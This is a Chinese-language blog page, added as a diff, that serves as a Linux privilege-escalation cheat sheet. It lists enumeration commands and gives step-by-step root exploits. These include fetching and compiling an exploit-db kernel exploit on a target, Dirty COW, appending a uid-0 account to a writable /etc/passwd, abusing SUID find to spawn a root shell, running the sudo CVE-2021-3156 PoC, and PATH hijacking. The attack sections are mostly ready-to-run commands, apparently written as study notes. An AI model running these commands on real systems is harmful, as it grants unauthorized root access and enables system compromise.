@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/favicon/apple-touch-icon.png?v=2.8.0" sizes="180x180"><meta name="description" content="信息收集                           手动收集信息        查看操作系统版本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="https://www.ixxzhi.cn/2023/08/20/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="冰糖の部落阁">
+<meta property="og:description" content="信息收集                           手动收集信息        查看操作系统版本">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-19T16:30:33.000Z">
+<meta property="article:modified_time" content="2023-08-22T16:12:44.861Z">
+<meta property="article:author" content="冰糖小混子">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary"><title>Linux提权 | 冰糖の部落阁</title><link ref="canonical" href="https://www.ixxzhi.cn/2023/08/20/Linux%E6%8F%90%E6%9D%83/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: {"appId":"AKOK4JB6FU","apiKey":"afe2853f80920ee4cdb1d45209c0ecf2","indexName":"blog_ixxzhi","hits":{"per_page":10},"languages":{"inputPlaceholder":"搜索文章","hitsEmpty":"没有找到任何搜索结果：${query}","hitsStats":"找到 ${hits} 条搜索结果，耗时 ${time} 毫秒"}},
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">冰糖の部落阁</div><div class="header-banner-info__subtitle">冰糖的笔记和随笔</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Linux提权</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-08-23</span></span></div></header><div class="post-body">
+        <h1 id="信息收集"   >
+          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1>
+      
+        <h2 id="手动收集信息"   >
+          <a href="#手动收集信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h2>
+      <blockquote>
+<p>查看操作系统版本</p>
+</blockquote>
+<span id="more"></span>
+
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/lsb-release</span><br><span class="line"><span class="built_in">cat</span> /etc/redhat-release</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>查看内核版本</p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">uname</span> -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line"><span class="built_in">ls</span> /boot | grep vmlinuz</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="工具收集信息"   >
+          <a href="#工具收集信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具收集信息" class="headerlink" title="工具收集信息"></a>工具收集信息</h2>
+      <blockquote>
+<p>信息收集</p>
+</blockquote>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum" >https://github.com/rebootuser/LinEnum</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<blockquote>
+<p>提权exp收集</p>
+</blockquote>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester" >https://github.com/mzet-/linux-exploit-suggester</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2" >https://github.com/jondonas/linux-exploit-suggester-2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="本地内核提权"   >
+          <a href="#本地内核提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地内核提权" class="headerlink" title="本地内核提权"></a>本地内核提权</h1>
+      <ol>
+<li><p>查看版本信息</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>扫描当前版本是否有漏洞</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 4.10.0-19</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>查看exp信息</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/45010.c</span><br><span class="line"><span class="comment">#查看exp利用方法</span></span><br><span class="line">https://www.exploit-db.com/exploits/45010</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>使用该CVE提权</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#复制文件到当前目录</span></span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/45010.c .</span><br><span class="line"><span class="comment">#当前目录下启动web服务</span></span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>靶机wget下载该文件</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 172.168.20.105:80/45010.c -O bt.c</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>编译运行，提权</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc bt.c -o bt</span><br><span class="line"><span class="built_in">chmod</span> +x bt</span><br><span class="line">./bt</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+
+        <h1 id="脏牛提权"   >
+          <a href="#脏牛提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h1>
+      <ul>
+<li>漏洞描述<ul>
+<li>编号：CVE-2016-5195</li>
+<li>名称：脏牛</li>
+<li>危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</li>
+<li>影响范围：Linux kernel&gt;&#x3D;2.6.22 | Android&lt;2016-10-18</li>
+</ul>
+</li>
+<li>漏洞原理<ul>
+<li>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a </span><br><span class="line">寻找exp: https://www.exploit-db.com/exploits/40847</span><br><span class="line">编译：g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">wget下载</span><br><span class="line">执行文件 ./dcow -s</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="etc-passwd可写提权"   >
+          <a href="#etc-passwd可写提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#etc-passwd可写提权" class="headerlink" title="&#x2F;etc&#x2F;passwd可写提权"></a>&#x2F;etc&#x2F;passwd可写提权</h1>
+      <ol>
+<li><p>使用perl生成带有盐值的密码</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;aaabbcc&quot;,&quot;123456&quot;)&#x27;</span></span><br><span class="line">12BWKETBcM70Q</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>将信息添加到&#x2F;etc&#x2F;passwd文件中</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaa:12Qm6c8LFmbDA:0:0:User_like_root:/root:/bin/bash&quot;</span> &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>切换用户</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su aaa</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+
+        <h1 id="定时任务提权"   >
+          <a href="#定时任务提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h1>
+      <blockquote>
+<p>手动收集信息</p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></div></figure>
+
+<p>添加suid权限</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看权限：whereis find</span><br><span class="line">添加权限：<span class="built_in">chmod</span> u+s /usr/bin/find</span><br><span class="line">查看权限：发现有了suid权限</span><br><span class="line">取消suid权限：<span class="built_in">chmod</span> 755 /usr/bin/find</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="sudo提权"   >
+          <a href="#sudo提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h1>
+      <p>Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是&#x2F;etc&#x2F;sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。</p>
+<blockquote>
+<p>列出目前用户可执行与无法执行的指令</p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>查看sudo版本</p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo --version</span><br><span class="line">以下版存在安全隐患</span><br><span class="line">sudo 1.8.2 -- 1.8.31p2</span><br><span class="line">sudo 1.9.0 -- 1.9.5.5p1</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p>漏洞探测</p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s /</span><br><span class="line"><span class="comment">#返回以：&quot;sudoedit:&quot;开头的错误可能存在安全风险</span></span><br><span class="line"><span class="comment">#返回以：&quot;usage:&quot;开头的错误响应，则无影响</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="复现"   >
+          <a href="#复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现" class="headerlink" title="复现"></a>复现</h2>
+      <blockquote>
+<p>POC地址</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz" >https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz</span><br><span class="line"><span class="built_in">cd</span> CVE-2021-3156/</span><br><span class="line">make</span><br><span class="line">./sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="环境变量提取"   >
+          <a href="#环境变量提取" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境变量提取" class="headerlink" title="环境变量提取"></a>环境变量提取</h2>
+      <p>新建一段c代码：demo.c</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>编译：gcc demo.c -o abc<br>复制到：&#x2F;home 目录下<br>添加权限：chmod u+s abc<br>查看哪些具有suid权限：find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+
+        <h1 id="使用cp命令提权"   >
+          <a href="#使用cp命令提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用cp命令提权" class="headerlink" title="使用cp命令提权"></a><strong>使用cp命令提权</strong></h1>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line">将原本就存在的sh文件复制到/tmp下命名为ps,所以在/tmp下，./ps就可以执行sh，但ps的结果还是</span><br><span class="line">正常查看进程</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">这时候执行ps就是执行sh,因为环境变量加入了/tmp下</span><br><span class="line">./abc</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">提权成功</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://www.ixxzhi.cn">冰糖小混子</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://www.ixxzhi.cn/2023/08/20/Linux%E6%8F%90%E6%9D%83/">https://www.ixxzhi.cn/2023/08/20/Linux%E6%8F%90%E6%9D%83/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/%E6%8F%90%E6%9D%83/">提权</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/20/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%AB%99/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">常用工具/网站</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/20/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">常见中间件框架漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="utterances-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">
+          手动收集信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">
+          工具收集信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">
+          本地内核提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">
+          脏牛提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#etc-passwd%E5%8F%AF%E5%86%99%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">
+          &#x2F;etc&#x2F;passwd可写提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">
+          定时任务提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">
+          sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.1.</span> <span class="toc-text">
+          复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E5%8F%96"><span class="toc-number">6.2.</span> <span class="toc-text">
+          环境变量提取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8cp%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">
+          使用cp命令提权</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/avatar.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">冰糖小混子</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">31</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">23</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>冰糖小混子</span><span class="footer__devider">|</span><span><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">蒙ICP备20002846号</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"></div><div class="search-results"><div id="algolia-hits"></div></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', function () {
+  $('.header-nav-search').on('click', function (e) {
+    e.stopPropagation();
+
+    $('body').css('overflow', 'hidden');
+    $('.search-popup')
+      .velocity('stop')
+      .velocity('transition.expandIn', {
+        duration: 300,
+        complete: function () {
+          $('.search-popup input').focus();
+        }
+      });
+    $('.search-mask')
+      .velocity('stop')
+      .velocity('transition.fadeIn', {
+        duration: 300
+      });
+  });
+
+  function closeSearch () {
+    $('body').css({ overflow: 'auto' });
+    $('.search-popup').css({ display: 'none' });
+    $('.search-mask').css({ display: 'none' });
+  }
+
+  $('.search-mask, .search-close').on('click', function () {
+    closeSearch();
+  });
+
+  $(document).on('keydown', function (e) {
+    // Escape <=> 27
+    if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+      closeSearch();
+    }
+  });
+
+  var algolia = CONFIG.algolia;
+  if (!algolia && !(algolia.appId && algolia.apiKey && algolia.indexName)) {
+    return console.error('Algolia setting is invalid.');
+  }
+
+  var search = instantsearch({
+    appId: algolia.appId,
+    apiKey: algolia.apiKey,
+    indexName: algolia.indexName,
+    searchParameters: {
+      hitsPerPage: algolia.hits.per_page || 10
+    },
+    searchFunction: function (helper) {
+      var searchInput = $('.search-input').find('input');
+
+      if (searchInput.val()) {
+        helper.search();
+      }
+    }
+  });
+
+  search.addWidget(
+    instantsearch.widgets.searchBox({
+      container: '.search-input',
+      reset: false,
+      magnifier: false,
+      placeholder: algolia.languages.inputPlaceholder
+    })
+  );
+
+  // The hits of search results.
+  search.addWidget(
+    instantsearch.widgets.hits({
+      container: '#algolia-hits',
+      templates: {
+        item: function (data) {
+          var link = data.permalink ? data.permalink : CONFIG.root + data.path;
+          return (
+            '<a href="' + link + '" class="algolia-hit-item-link">' +
+              data._highlightResult.title.value +
+            '</a>'
+          );
+        },
+        empty: function (data) {
+          return (
+            '<div id="algolia-hits-empty">' +
+              algolia.languages.hitsEmpty.replace(/\$\{query}/, data.query) +
+            '</div>'
+          );
+        }
+      },
+      cssClasses: {
+        item: 'algolia-hit-item'
+      }
+    })
+  );
+
+  // The stats of search results.
+  if ($('#algolia-stats')[0]) {
+    search.addWidget(
+      instantsearch.widgets.stats({
+        container: '#algolia-stats',
+        templates: {
+          body: function (data) {
+            var stats = algolia.languages.hitsStats
+              .replace(/\$\{hits}/, data.nbHits)
+              .replace(/\$\{time}/, data.processingTimeMS);
+            return (
+              stats +
+              '<span class="algolia-logo pull-right">' +
+                '<img src="' + CONFIG.root +
+                `${CONFIG.sourcePath.images}/algolia.svg" alt="Algolia" />` +
+              '</span>'
+            );
+          }
+        }
+      })
+    );
+  }
+
+  // The pagination of the results.
+  search.addWidget(
+    instantsearch.widgets.pagination({
+      container: '#algolia-pagination',
+      scrollTo: false,
+      showFirstLast: false,
+      labels: {
+        first: '<i class="fa fa-angle-double-left"></i>',
+        last: '<i class="fa fa-angle-double-right"></i>',
